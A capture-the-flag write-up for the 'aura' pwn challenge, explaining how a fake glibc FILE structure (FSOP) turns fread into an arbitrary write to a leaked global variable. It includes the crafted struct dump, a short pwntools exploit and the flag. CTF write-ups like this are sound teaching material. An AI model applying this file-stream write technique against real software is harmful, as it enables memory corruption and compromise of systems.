# aura

## 🧩 Challenge Summary

- **Category**: Pwn  
- **Points**: 438  
- **Solves**: 77 teams

---

### 📝 Problem Description

> I can READ ur aura.

---

## 🧠 Challenge Structure

The binary leaks the address of a global variable called `aura`, and asks the user to send some input. Depending on whether `aura` is set to a nonzero value, the program either reads and prints the flag or denies access.

```c
printf("my aura: %p\nur aura? ", &aura);
FILE *buf = fopen("/dev/null", "r");
read(0, buf, 0x100);
fread(ptr, 1, 8, buf);

if (aura) {
    FILE *stream = fopen("flag.txt", "r");
    fread(v6, 1, 0x11, stream);
    printf("%s\n", v6);
} else {
    puts("u have no aura.");
}
```

Protections:

```
Arch:       amd64-64-little  
RELRO:      Partial RELRO  
Stack:      Canary found  
NX:         NX enabled  
PIE:        PIE enabled  
Stripped:   No
```

- PIE is enabled, but the program leaks the address of `aura`, giving us an absolute target.
- The stack is protected, but we don’t need to touch it.
- The main goal is to set `aura` to a nonzero value.

---

## ✅ Exploitation Flow

### 🔹 Step 1: Leak

The program prints the address of the global variable `aura`, despite PIE being enabled. This gives us a reliable memory address to target later in the exploit.

```c
printf("my aura: %p\nur aura? ", &aura);
```

---

### 🔹 Step 2: FSOP — Arbitrary Address Write via Fake FILE Structure

After leaking the address, the binary does the following:

```c
FILE *buf = fopen("/dev/null", "r");
read(0, buf, 0x100);
fread(ptr, 1, 8, buf);
```

Here, `buf` is a pointer to a `FILE` structure allocated by `fopen()`.  
The call to `read(0, buf, 0x100)` directly overwrites the memory pointed to by `buf` — in other words, the `FILE` structure itself.  
This gives us a powerful primitive: **we can craft and inject a fake `FILE` structure in memory**.

We exploit this to redirect the `fread()` call into writing arbitrary data to the `aura` variable.

### 🔸 FSOP Requirements for Arbitrary Write

To trigger a successful write using `fread()` via a crafted `FILE` structure, the following conditions must be satisfied:

| Field                    | Requirement                                                                 |
|--------------------------|-----------------------------------------------------------------------------|
| `_flags`                 | Must not contain `_IO_NO_READS` (`0x4`). Set `_flags & ~0x4`.               |
| `_IO_read_ptr == _IO_read_end` | Triggers `__underflow()` to call `read()` — assumes buffer is empty.       |
| `_IO_buf_base`           | Set to the target address (in this case, `aura`).                           |
| `_IO_buf_end`            | Set to `aura + n` (write length).                                           |
| `_fileno`                | Set to `0` (STDIN), so we can supply data via standard input.               |

In the actual exploit, only the essential fields are overwritten. The rest (like `_lock`, `_wide_data`, etc.) retain their original values from `fopen("/dev/null", "r")`, keeping the structure valid enough for libc internals to operate without crashing.

Example state of the `FILE` structure after crafting:

```c
{
  _flags = 0x0,
  _IO_read_ptr = 0x0,
  _IO_read_end = 0x0,
  _IO_read_base = 0x0,
  _IO_write_base = 0x0,
  _IO_write_ptr = 0x0,
  _IO_write_end = 0x0,
  _IO_buf_base = 0x642e437ad08c <aura> "",
  _IO_buf_end = 0x642e437ad09c "",
  _IO_save_base = 0x0,
  _IO_backup_base = 0x0,
  _IO_save_end = 0x0,
  _markers = 0x0,
  _chain = 0x0,
  _fileno = 0x0,
  _flags2 = 0x0,
  _old_offset = 0x0,
  _cur_column = 0x0,
  _vtable_offset = 0x0,
  _shortbuf = "",
  _lock = 0x642e4be76380,
  _offset = 0xffffffffffffffff,
  _codecvt = 0x0,
  _wide_data = 0x642e4be76390,
  _freeres_list = 0x0,
  _freeres_buf = 0x0,
  __pad5 = 0x0,
  _mode = 0x0,
  _unused2 = '\0' <repeats 19 times>
}
```

With this structure in place, `fread()` effectively becomes:

```c
read(0, aura, 0x10);
```

Here’s the corresponding exploit code:

```python
fs = FileStructure()
r.sendafter(b"aura? ", fs.read(aura, 0x10))
r.wait(0.1)
r.send(b"A" * 0x10)
```

- `FileStructure()` is a helper class for building fake `FILE` structs.
- `fs.read(aura, 0x10)` creates a structure with `_IO_buf_base` pointing to `aura`, enabling `fread()` to write 0x10 bytes to that address.
- Sending `b"A" * 0x10` sets `aura` to a non-zero value, which makes the program print the flag.

---

### 🔹 Step 3: Summary

| Step | Action                                                          |
|------|-----------------------------------------------------------------|
| 1    | Leak the address of `aura`.                                     |
| 2    | Craft and inject a fake `FILE` structure that writes to `aura`. |
| 3    | Send any non-zero data (e.g., `b"A" * 0x10`).                    |
| 4    | Flag is printed.                                                |

---

## 🏁 Flag

```
UMDCTF{+100aur4}
```
